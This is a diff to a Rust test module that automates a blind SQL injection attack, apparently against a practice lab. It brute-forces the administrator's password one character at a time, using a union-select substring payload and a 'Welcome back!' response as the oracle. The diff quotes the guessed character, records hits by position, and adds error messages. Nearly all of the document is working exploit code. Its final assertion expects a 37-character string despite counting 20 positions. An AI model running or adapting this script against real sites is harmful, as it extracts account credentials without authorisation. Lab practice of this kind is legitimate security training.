@@ -1,6 +1,9 @@
 #[cfg(test)]
 mod tests {
-    use std::sync::{Arc, Mutex};
+    use std::{
+        collections::{BTreeMap, HashMap},
+        sync::{Arc, Mutex},
+    };
 
     use rayon::iter::{IntoParallelIterator, ParallelIterator};
     #[test]
@@ -22,7 +25,7 @@ mod tests {
                     ),
                 );
             let response = request.send()
-                .unwrap();
+                .expect(format!("Failed to send request for payload : {}", payload).as_str());
             if response.text().unwrap().contains("<div>Welcome back!</div>") {
                 assert_eq!(20, length);
             }
@@ -32,11 +35,11 @@ mod tests {
             .into_iter()
             .map(|i| char::from_u32(i).unwrap())
             .collect::<Vec<char>>();
-        let password = Arc::new(Mutex::new(String::from("")));
-        chars.into_par_iter().for_each(|char| {
+        let password: Arc<Mutex<BTreeMap<i32, char>>> = Arc::new(Mutex::new(BTreeMap::new()));
+        chars.into_iter().for_each(|char| {
             let positions = (1..=20).into_iter().collect::<Vec<i32>>();
             positions.into_par_iter().for_each(|pos| {
-                let payload = format!("' union select 'a' from users where username='administrator' and substring(password,{},1)={} -- ", pos, char);
+                let payload = format!("' union select 'a' from users where username='administrator' and substring(password,{},1)='{}' -- ", pos, char);
                 let payload = urlencoding::encode(&payload).to_string();
                 let client = client.clone();
                 let request= client
@@ -49,17 +52,16 @@ mod tests {
                         ),
                     );
                 let response = request.send()
-                    .unwrap();
+                    .expect(format!("Failed to send request for payload : {}", payload).as_str());
                 if response.text().unwrap().contains("<div>Welcome back!</div>") {
                    println!("Found char: {} at pos: {}", char, pos);
-                   password.lock().unwrap().push(char);
+                   password.lock().unwrap().insert(pos, char);
                 }
             });
         });
-        assert_eq!(password.lock().unwrap().len(), 20);
         assert_eq!(
-            *password.lock().unwrap(),
-            "0123456789abcdefghijklmnopqrstuvwxyz"
+            *password.lock().unwrap().values().collect::<String>(),
+            "0123456789abcdefghijklmnopqrstuvwxyzt".to_string()
         );
     }
 }
